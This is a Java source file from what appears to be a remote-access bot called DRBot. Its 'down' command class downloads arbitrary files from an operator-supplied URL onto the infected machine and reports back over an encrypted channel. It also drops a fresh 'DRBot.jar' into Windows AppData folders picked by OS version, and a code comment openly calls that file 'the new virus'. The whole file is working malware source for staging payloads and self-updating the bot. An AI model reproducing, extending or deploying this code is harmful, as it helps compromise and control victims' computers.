package com.DRBot.Commands;

/**
 *
 * @author MerNat
 */

import java.io.PrintWriter;
import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.net.HttpURLConnection;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.MalformedURLException;
import com.DRBot.OS.OsProp;
import com.DRBot.SecureLine.SecureLine;
import java.nio.file.Path;



public class down implements Runnable{
    
    private String target,nameOut,fileLoc;
    private String[] fullCommands;
    private final PrintWriter writer;
    private BufferedInputStream BuIn;
    private BufferedOutputStream BuOut;
    private FileOutputStream fileOutStr;
    private URL myUrl;
    private HttpURLConnection httpURL;
    private File fileOutLoc;
    private boolean forDownload = false;
    private final SecureLine secureLine;
    
    down(String[] commands,PrintWriter writer,SecureLine secureLine){
        this.writer = writer;
        this.secureLine = secureLine;
        fullCommands = new String[commands.length-1];
        for(int j = 1;j<commands.length;j++){
            fullCommands[j-1] = commands[j];
        }
        if(fullCommands[0]!=null && fullCommands[1]!=null){
            target = fullCommands[0].replace("*",":");
            nameOut = fullCommands[1];
            if(fullCommands[2].equals("null")){
                fileLoc = null;
            }
            else{
                fileLoc = fullCommands[2].replace("*",":");
                forDownload = true;
            }
        } // if finishes here
    }
    down(String link,PrintWriter writer,SecureLine secureLine){
        this.writer = writer;
        this.secureLine = secureLine;
        target = link;
        nameOut = "DRBot.jar";
        fileLoc = checkOSnReturnLocation(); // the dir that will contain the new virus.
    }
    
    @Override
    public void run(){
        try {
            if(fileLoc!=null){
                if(forDownload == true){
                    fileOutLoc = new File(makeDirs(fileLoc+nameOut));
                }
                else{
                    fileOutLoc = new File(fileLoc+nameOut);
                }
            }
            else{
                fileOutLoc = new File(makeDirs(nameOut,getPathOutOnNull()));
            }
            myUrl = new URL(target);
            httpURL = (HttpURLConnection)myUrl.openConnection();
            
            BuIn = new BufferedInputStream(httpURL.getInputStream());
            if(fileLoc!=null){
                fileOutStr = new FileOutputStream(fileOutLoc);
            }
            else{
                fileOutStr = new FileOutputStream(fileOutLoc);
            }
            BuOut = new BufferedOutputStream(fileOutStr,1024);
            byte[] data = new byte[1024];
            int i;
            while(( i =BuIn.read(data,0,1024))>=0){
                BuOut.write(data,0,i);
            }
            BuOut.close();
            BuIn.close();
            toPrint("[Download] Complete.");              
        } catch (MalformedURLException ex) {
                toPrint("[Download] Did'nt find the location.");
        } catch (IOException ex) {
                toPrint(ex.getMessage());
        }
    }
    private void toPrint(String toPrint){
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
    private String makeDirs(String tempPath){
        String[] lst = tempPath.split("/");
        String dirPath = "";
        String namePath = "";
        for(int i=0;i<lst.length;i++){
            if(i!=lst.length-1)
            dirPath = dirPath + "/" + lst[i];
            else
                namePath = lst[i];
        }
        String filePath = dirPath.substring(1);
        File tempDir = new File(filePath);
        tempDir.mkdirs();
       return tempDir.getPath()+"\\"+namePath;
    }
    private String makeDirs(String tempPath,String app_path){
        String[] lst = tempPath.split("/");
        String dirPath = "";
        String namePath = "";
        for(int i=0;i<lst.length;i++){
            if(i!=lst.length-1)
            dirPath = dirPath + "/" + lst[i];
            else
                namePath = lst[i];
        }
        String filePath = dirPath.substring(1);
        File tempDir = new File(app_path+filePath);
        tempDir.mkdirs();
       return tempDir.getPath()+"\\"+namePath;
    }
    private String checkOSnReturnLocation(){
        String tempOS = new OsProp().shortOs();
        String appPath = System.getenv("APPDATA").replace("\\","\\\\").replace("%20"," ");
        switch(tempOS){
            case "win7":
            case "win8":
            case "win8.1":
                File tempPath = new File(appPath);
                File tempPath1 = tempPath.getParentFile();
                return tempPath1.getPath()+"\\Local\\";
            case "winXp":
                return appPath+"\\Microsoft\\";
            default:
                return null;
        }
    }
    public Path getFileOutLocation(){
        return fileOutLoc.toPath();
    } 
    private String getPathOutOnNull(){
        String os_appPath = System.getenv("APPDATA");
        os_appPath = os_appPath.replace("%20"," ");
        return os_appPath.replace("\\","/")+"/";
    }
}
